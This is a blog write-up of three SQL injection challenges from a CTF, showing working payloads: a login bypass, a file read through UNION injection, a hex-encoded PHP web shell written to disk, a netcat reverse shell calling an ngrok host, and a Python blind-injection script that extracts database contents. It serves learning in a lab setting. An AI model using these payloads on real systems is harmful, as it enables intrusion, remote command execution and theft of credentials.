<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="CTFs CTF_INSA_2024 Web SQLi" /><meta name="author" content="BatBato" /><meta property="og:locale" content="en" /><meta name="description" content="SQLi 1" /><meta property="og:description" content="SQLi 1" /><link rel="canonical" href="nouman404.github.io/CTFs/CTF_INSA_2024/Web/SQLi/" /><meta property="og:url" content="nouman404.github.io/CTFs/CTF_INSA_2024/Web/SQLi/" /><meta property="og:site_name" content="BatBato’s Blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-02-05T00:00:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="CTFs CTF_INSA_2024 Web SQLi" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@BatBato" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"BatBato"},"dateModified":"2024-03-06T21:15:53+01:00","datePublished":"2024-02-05T00:00:00+01:00","description":"SQLi 1","headline":"CTFs CTF_INSA_2024 Web SQLi","mainEntityOfPage":{"@type":"WebPage","@id":"nouman404.github.io/CTFs/CTF_INSA_2024/Web/SQLi/"},"url":"nouman404.github.io/CTFs/CTF_INSA_2024/Web/SQLi/"}</script><title>CTFs | CTF_INSA_2024 | Web | SQLi | BatBato's Blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="BatBato's Blog"><meta name="application-name" content="BatBato's Blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/icon.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">BatBato's Blog</a></div><div class="site-subtitle font-italic">BatBato was here :)</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/notes/" class="nav-link"> <i class="fa-fw fas fa-sticky-note ml-xl-3 mr-xl-3 unloaded"></i> <span>NOTES</span> </a><li class="nav-item"> <a href="/sources/" class="nav-link"> <i class="fa-fw fas fa-folder-open ml-xl-3 mr-xl-3 unloaded"></i> <span>SOURCES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/Nouman404" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://app.hackthebox.com/profile/235762" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a> <a href="https://tryhackme.com/p/Batbato" aria-label="tryhackme" target="_blank" rel="noopener"> <i class="fas fa-cloud"></i> </a> <a href="https://www.root-me.org/BatBato" aria-label="rootme" target="_blank" rel="noopener"> <i class="fas fa-skull"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>CTFs | CTF_INSA_2024 | Web | SQLi</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>CTFs | CTF_INSA_2024 | Web | SQLi</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1707087600" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Feb 5, 2024 </em> </span> <span> Updated <em class="" data-ts="1709756153" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Mar 6, 2024 </em> </span><div class="d-flex justify-content-between"> <span> By <em> Bat </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1212 words"> <em>6 min</em> read</span></div></div></div><div class="post-content"><h1 id="sqli-1">SQLi 1</h1><p><img data-src="https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/CTF_INSA_2024/photos/sqli1_sujet.png" alt="[sqli1_sujet.png]" data-proofer-ignore></p><p>Here, we are tasked to perform SQL injections. An IPS is configured, this means that we can’t use tools like <code class="language-plaintext highlighter-rouge">SQLMap</code> because we would be blocked. We can see, that we are facing a login page. In CTF environment, the first thing that comes to your mind when you see a login page (after trying default credentials) is to perform an SQLi to bypass the authentication process. Using the payload <code class="language-plaintext highlighter-rouge">admin' OR True -- -</code> will result in a <code class="language-plaintext highlighter-rouge">SQL</code> query looking like: <code class="language-plaintext highlighter-rouge">Select * From Users where username='admin' OR True -- - AND password='a'</code></p><p>As you can see, we are looking for the username <code class="language-plaintext highlighter-rouge">admin</code> but we use a <code class="language-plaintext highlighter-rouge">True</code> statement. The <code class="language-plaintext highlighter-rouge">username='admin' OR True</code> will result in a <code class="language-plaintext highlighter-rouge">True</code> statement. This will authenticate us as the first user in the database that is often the admin.</p><blockquote class="prompt-info"><div><p>Note the use of <code class="language-plaintext highlighter-rouge">-- -</code>, this allows us to comment the rest of the query. Thanks to that, we can bypass the need of the password.</p></div></blockquote><p><img data-src="https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/CTF_INSA_2024/photos/sqli1_login.png" alt="[sqli1_login.png]" data-proofer-ignore></p><p>And voilà, we are authenticated as <code class="language-plaintext highlighter-rouge">admin</code> and we have the flag:</p><p><img data-src="https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/CTF_INSA_2024/photos/sqli1_flag.png" alt="[sqli1_flag.png]" data-proofer-ignore></p><h1 id="sqli-2">SQLi 2</h1><p><img data-src="https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/CTF_INSA_2024/photos/sqli2_sujet.png" alt="[sqli2_sujet.png]" data-proofer-ignore></p><p>Here we need to perform a more difficult <code class="language-plaintext highlighter-rouge">SQLi</code>. We first need to search for the vulnerable parameter. Here it is <code class="language-plaintext highlighter-rouge">id</code>:</p><p><img data-src="https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/CTF_INSA_2024/photos/sqli2_vuln.png" alt="[sqli2_vuln.png]" data-proofer-ignore></p><p>We will try a <code class="language-plaintext highlighter-rouge">UNION based SQLi</code>. First we need to know how much columns are used in the <code class="language-plaintext highlighter-rouge">SQL</code> query. To do that we can simply use a payload like <code class="language-plaintext highlighter-rouge">UNION SELECT NULL -- -</code> then if there is no page printed out, we use the payload <code class="language-plaintext highlighter-rouge">UNION SELECT NULL,NULL -- -</code> and so on until we have a page that we can see:</p><p><img data-src="https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/CTF_INSA_2024/photos/sqli2_collumns.png" alt="[sqli2_collumns.png]" data-proofer-ignore></p><p>As we can see from our <code class="language-plaintext highlighter-rouge">UNION based SQLi</code>, we know that there are 4 rows in the query. We can now use this to read file like in the <code class="language-plaintext highlighter-rouge">LFI 2</code> challenge:</p><p><code class="language-plaintext highlighter-rouge">http://ctf.insa-cvl.fr:1003/post.php?id=-1%20UNION%20SELECT%20NULL,to_base64(load_file(%22/var/www/html/index.php%22)),NULL,NULL%20--%20-</code></p><p>This payload gives us a <code class="language-plaintext highlighter-rouge">base64</code> string of the content of <code class="language-plaintext highlighter-rouge">index.php</code> source code. We can decode it and we get:</p><p><img data-src="https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/CTF_INSA_2024/photos/sqli2_index.png" alt="[sqli2_index.png]" data-proofer-ignore></p><p>There is no flag here. But we notice a file called <code class="language-plaintext highlighter-rouge">db_config.php</code>. Lets check this file:</p><p><img data-src="https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/CTF_INSA_2024/photos/sqli2_flag.png" alt="[sqli2_flag.png]" data-proofer-ignore></p><p>And voilà… We get the username and password for the database and the flag.</p><h1 id="sqli-3">SQLI 3</h1><p><img data-src="https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/CTF_INSA_2024/photos/sqli3_sujet.png" alt="[sqli3_sujet.png]" data-proofer-ignore></p><p>Now this challenge is a bit harder than the previous one because we need to <code class="language-plaintext highlighter-rouge">upload</code> a shell to the machine. It can be a reverse or web shell, it doesn’t matter. As we can see, when we enter a string we get the exact syntax of the <code class="language-plaintext highlighter-rouge">SQL</code> query:</p><p><img data-src="https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/CTF_INSA_2024/photos/sqli3_vuln.png" alt="[sqli3_vuln.png]" data-proofer-ignore></p><p>We will use the following payload to write into the <code class="language-plaintext highlighter-rouge">css</code> folder (the only one where we have rights) in the <code class="language-plaintext highlighter-rouge">bipbip.php</code> file.</p><p><code class="language-plaintext highlighter-rouge">' union select NULL, 0x3c3f7068700a20202020696628697373657428245f4745545b27636d64275d29202626204d443528245f4745545b2770617373275d29203d3d2022636136333537343336306235303061626133336333356163393334333535663122290a202020207b0a202020202020202073797374656d28245f4745545b27636d64275d293b0a202020207d0a3f3e0a into dumpfile '/var/www/html/css/bipbip.php' #</code></p><p>The content of the hexadecimal string it the following:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>&lt;?php
    if(isset($_GET['cmd']) &amp;&amp; MD5($_GET['pass']) == "ca63574360b500aba33c35ac934355f1")
    {
        system($_GET['cmd']);
    }
?&gt;
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Note the use of the hex string instead of putting the plain <code class="language-plaintext highlighter-rouge">PHP</code> code. This is because sometimes you will get errors because some characters can be removed for exemple.</p></div></blockquote><blockquote class="prompt-tip"><div><p>Note the use of a password. This is a good practice because you don’t want other teams to be able to use you shell and in a more realist environment you don’t want hackers to be able to use the tools that you are using in your pentest to exploit the company you are assessing.</p></div></blockquote><p>Now we can just call our file and specify the command and the password:</p><p><img data-src="https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/CTF_INSA_2024/photos/sqli3_exploit.png" alt="[sqli3_exploit.png]" data-proofer-ignore></p><p>We want a reverse shell on the machine, I used this one:</p><p><code class="language-plaintext highlighter-rouge">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 4.tcp.eu.ngrok.io 14433 &gt;/tmp/f</code></p><p>Note that if you copy/paste this payload in your <code class="language-plaintext highlighter-rouge">cmd</code> parameter it won’t work. You will have to <code class="language-plaintext highlighter-rouge">URL Encode</code> it first (and change the IP and port by your values ;) ) .</p><p>I already set up a listener using <code class="language-plaintext highlighter-rouge">nc -lvnp 4444</code> and a <code class="language-plaintext highlighter-rouge">ngrok</code> to be able to be accessible by the server (<code class="language-plaintext highlighter-rouge">ngrok tcp 4444</code>).</p><blockquote class="prompt-tip"><div><p>Here we are using <code class="language-plaintext highlighter-rouge">ngrok</code> because we are not on the same network as the machine we are trying to hack. In CTF like <code class="language-plaintext highlighter-rouge">Try Hack Me</code> we don’t need <code class="language-plaintext highlighter-rouge">ngrok</code> and can simply use <code class="language-plaintext highlighter-rouge">nc -lvnp 4444</code> because we will have an IP on the same network.</p></div></blockquote><p>As you can see, I got a shell and I beautified it:</p><p><img data-src="https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/CTF_INSA_2024/photos/sqli3_rev_shell.png" alt="[sqli3_rev_shell.png]" data-proofer-ignore></p><p>Now we can access the full database by simply connecting to <code class="language-plaintext highlighter-rouge">mysql</code> using default credentials. Those credentials can be found in the <code class="language-plaintext highlighter-rouge">PHP</code> source code of the web pages:</p><p><code class="language-plaintext highlighter-rouge">mysql -u root -proot</code></p><p>Now we can list databases, list tables inside the <code class="language-plaintext highlighter-rouge">loginsqli</code> and show all the values in the <code class="language-plaintext highlighter-rouge">users</code> table:</p><p><img data-src="https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/CTF_INSA_2024/photos/sqli3_mysql.png" alt="[sqli3_mysql.png]" data-proofer-ignore></p><p>We now have the password of <code class="language-plaintext highlighter-rouge">bob</code> (<code class="language-plaintext highlighter-rouge">superbob</code>) that is the flag to validate the challenge.</p><p>Here is a python code that will use an blind/error based SQLi. It performs a dichotomy to retrieve character by character the name of the database, the name of the tables, the name of the columns and the values:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">time</span>
<span class="kn">import</span> <span class="n">string</span>
<span class="kn">from</span> <span class="n">math</span> <span class="kn">import</span> <span class="n">ceil</span><span class="p">,</span> <span class="n">floor</span>


<span class="n">url_base</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://ctf.insa-cvl.fr:1009/</span><span class="sh">"</span>

<span class="n">alphabet</span> <span class="o">=</span> <span class="sa">r</span><span class="sh">"</span><span class="s">0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&amp;</span><span class="sh">'</span><span class="s">()*+,-./:;&lt;=&gt;?@[\]^_`{|}~</span><span class="sh">"</span>
<span class="n">timing</span> <span class="o">=</span> <span class="mi">1</span>

<span class="n">results</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span>

<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>

    <span class="n">candidats</span> <span class="o">=</span> <span class="p">[</span><span class="sh">""</span><span class="p">]</span>

    <span class="k">while</span> <span class="n">candidats</span><span class="p">:</span>

        <span class="c1">#print(candidats)
</span>        
        <span class="n">candidat</span> <span class="o">=</span> <span class="n">candidats</span><span class="p">.</span><span class="nf">pop</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
        <span class="n">index</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">candidat</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
        
        <span class="c1">#print("My candidat:",candidat, "Len candidat:", index)
</span>        <span class="nf">print</span><span class="p">(</span><span class="n">candidat</span><span class="p">)</span>
        <span class="n">start</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="n">end</span> <span class="o">=</span> <span class="mi">127</span>

        <span class="n">found</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="n">old_candidat</span> <span class="o">=</span> <span class="n">candidat</span>

        <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>

            <span class="n">mid</span> <span class="o">=</span> <span class="nf">floor</span><span class="p">((</span><span class="n">start</span> <span class="o">+</span> <span class="n">end</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span><span class="p">)</span>
            <span class="c1">#print(start, mid, end)
</span>            
            <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
            <span class="c1">#payload = f"1; select case when ascii(substring(version(), {index}, 1))&gt;={mid} then pg_sleep({timing}) else pg_sleep(0) end-- -"
</span>            <span class="c1">#payload = f"1; select case when ascii(substring(datname, {index}, 1))&gt;={mid} then pg_sleep({timing}) else pg_sleep(0) end from pg_database limit 1;-- -"
</span>            <span class="c1">#payload = f"1; select case when ascii(substring(table_name, {index}, 1))&gt;={mid} then pg_sleep({timing}) else pg_sleep(0) end from information_schema.tables limit 1;-- -"
</span>            <span class="c1">#payload = f"1; select case when ascii(substring(column_name, {index}, 1))&gt;={mid} then pg_sleep({timing}) else pg_sleep(0) end from information_schema.columns limit 1 offset {offset};-- -"
</span>            <span class="c1">#payload = f"1; select case when ascii(substring(password, {index}, 1))&gt;={mid} then pg_sleep({timing}) else pg_sleep(0) end from users limit 1 offset {offset};-- -"
</span>            <span class="c1">#payload =  f"admin' and ascii(MID(version(), {index}, 1))&gt;={mid}-- -"
</span>            <span class="c1">#payload =  f"admin' and ascii(MID(database(), {index}, 1))&gt;={mid}-- -"
</span>            <span class="c1">#payload =  f"admin' and ascii(MID((select group_concat(table_name) from information_schema.tables where table_schema=database()), {index}, 1))&gt;={mid}-- -"
</span>            <span class="c1">#payload =  f"admin' and ascii(MID((select group_concat(column_name) from information_schema.columns where table_name='users'), {index}, 1))&gt;={mid}-- -"
</span>            <span class="c1">#payload =  f"admin' and ascii(MID((select username from users limit {offset},1), {index}, 1))&gt;={mid}-- -"
</span>            <span class="c1">#payload =  f"admin' and ascii(MID((select description from users limit {offset},1), {index}, 1))&gt;={mid}-- -"
</span>            <span class="n">payload</span> <span class="o">=</span>  <span class="sa">f</span><span class="sh">"</span><span class="s">admin</span><span class="sh">'</span><span class="s"> and ascii(MID((select fname from users limit </span><span class="si">{</span><span class="n">offset</span><span class="si">}</span><span class="s">,1), </span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="s">, 1))&gt;=</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s">-- -</span><span class="sh">"</span>
            <span class="c1">#(select if((ascii(MID(@@version,{index},1)))&gt;={mid}, sleep({timing}, 0)))-- 
</span>            <span class="c1">#' or (select if(MID(@@version,{index},1))&gt;={mid}, sleep({timing}), 0)-- -
</span>            <span class="c1">#print(payload)
</span>            
            <span class="n">url_final</span> <span class="o">=</span> <span class="n">url_base</span>

            <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
                <span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span> <span class="n">payload</span>
            <span class="p">}</span>

            <span class="c1">#start_time = time.time()
</span>            <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url_final</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
            <span class="c1">#print(response.text)
</span>
            <span class="c1">#delta = time.time() - start_time
</span>            <span class="c1">#print(delta)
</span>
            <span class="k">if</span> <span class="sh">"</span><span class="s">demande</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
                <span class="k">if</span> <span class="n">mid</span> <span class="o">==</span> <span class="n">start</span><span class="p">:</span>
                    <span class="c1">#print(chr(mid))
</span>                    <span class="n">char</span> <span class="o">=</span> <span class="nf">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span>
                    <span class="k">if</span> <span class="n">char</span> <span class="o">!=</span> <span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">:</span>
                        <span class="n">candidats</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">candidat</span> <span class="o">+</span> <span class="n">char</span><span class="p">)</span>
                    <span class="k">else</span><span class="p">:</span>
                        <span class="n">results</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">candidat</span><span class="p">)</span>
                    <span class="k">break</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="n">start</span> <span class="o">=</span> <span class="n">mid</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">end</span> <span class="o">=</span> <span class="n">mid</span>
    
    <span class="n">offset</span> <span class="o">+=</span> <span class="mi">1</span>


<span class="nf">print</span><span class="p">(</span><span class="n">results</span><span class="p">)</span>
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctfs/'>CTFs</a>, <a href='/categories/ctf-insa-2024/'>CTF_INSA_2024</a>, <a href='/categories/web/'>Web</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/tags/sqli/" class="post-tag no-text-decoration" >SQLi</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=CTFs+%7C+CTF_INSA_2024+%7C+Web+%7C+SQLi+-+BatBato%27s+Blog&url=nouman404.github.io%2FCTFs%2FCTF_INSA_2024%2FWeb%2FSQLi%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=CTFs+%7C+CTF_INSA_2024+%7C+Web+%7C+SQLi+-+BatBato%27s+Blog&u=nouman404.github.io%2FCTFs%2FCTF_INSA_2024%2FWeb%2FSQLi%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=nouman404.github.io%2FCTFs%2FCTF_INSA_2024%2FWeb%2FSQLi%2F&text=CTFs+%7C+CTF_INSA_2024+%7C+Web+%7C+SQLi+-+BatBato%27s+Blog" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/Notes/AD/AD_Basics">Notes | AD | AD Basics</a><li><a href="/Notes/AD/Tools">Notes | AD | AD Tools</a><li><a href="/CTFs/HeroCTF_2024/Steganographie/Zipper">CTFs | HeroCTF_2024 | Steganographie | Zipper</a><li><a href="/CTFs/HeroCTF_2024/Forensique/LazySysAdmin2">CTFs | HeroCTF_2024 | Forensique | LazySysAdmin2</a><li><a href="/CTFs/HeroCTF_2024/Forensique/Tenant_trouble">CTFs | HeroCTF_2024 | Forensique | Tenant trouble</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/web/">Web</a> <a class="post-tag" href="/tags/forensique/">Forensique</a> <a class="post-tag" href="/tags/404ctf/">404CTF</a> <a class="post-tag" href="/tags/stegano/">Stegano</a> <a class="post-tag" href="/tags/fcsc/">FCSC</a> <a class="post-tag" href="/tags/forensic/">Forensic</a> <a class="post-tag" href="/tags/osint/">OSINT</a> <a class="post-tag" href="/tags/stega/">Stega</a> <a class="post-tag" href="/tags/reverse/">Reverse</a></div></div></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/CTFs/CTF_INSA_2024/Web/Attention_au_swap/"><div class="card-body"> <em class="small" data-ts="1707087600" data-df="ll" > Feb 5, 2024 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>CTFs | CTF_INSA_2024 | Web | Attention_au_swap</h3><div class="text-muted small"><p> Attention au swap In this challenge, we are asked to demonstrate some kind of vulnerability regarding the text editor vim. The name of the challenge gives us a hint on where to look for (swap). ...</p></div></div></a></div><div class="card"> <a href="/CTFs/CTF_INSA_2024/Web/LFI/"><div class="card-body"> <em class="small" data-ts="1707087600" data-df="ll" > Feb 5, 2024 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>CTFs | CTF_INSA_2024 | Web | LFI</h3><div class="text-muted small"><p> LFI 1 In this challenge, we are tasked to perform LFI on the given website. The LFI vulnerability often appear in the GET parameter directly in the URL. Here we can notice the ?page=accueil.php ...</p></div></div></a></div><div class="card"> <a href="/CTFs/404CTF_2023/Web/La_Vie_Fran%C3%A7aise"><div class="card-body"> <em class="small" data-ts="1685916000" data-df="ll" > Jun 5, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>CTFs | 404CTF_2023 | Web | La Vie Française</h3><div class="text-muted small"><p> La Vie Française When we arrive in this challenge, we access a web page where we can create an account by clicking on Postuler: Because I am someone really original, I created the user a with...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/CTFs/CTF_INSA_2024/Web/MegaUpload/" class="btn btn-outline-primary" prompt="Older"><p>CTFs | CTF_INSA_2024 | Web | MegaUpload</p></a> <a href="/CTFs/Finale_CTF_INSA_2024/Forensique/" class="btn btn-outline-primary" prompt="Newer"><p>CTFs | Finale_CTF_INSA_2024 | Forensique</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://github.com/Nouman404/">Bat</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/web/">Web</a> <a class="post-tag" href="/tags/forensique/">Forensique</a> <a class="post-tag" href="/tags/404ctf/">404CTF</a> <a class="post-tag" href="/tags/stegano/">Stegano</a> <a class="post-tag" href="/tags/fcsc/">FCSC</a> <a class="post-tag" href="/tags/forensic/">Forensic</a> <a class="post-tag" href="/tags/osint/">OSINT</a> <a class="post-tag" href="/tags/stega/">Stega</a> <a class="post-tag" href="/tags/reverse/">Reverse</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg 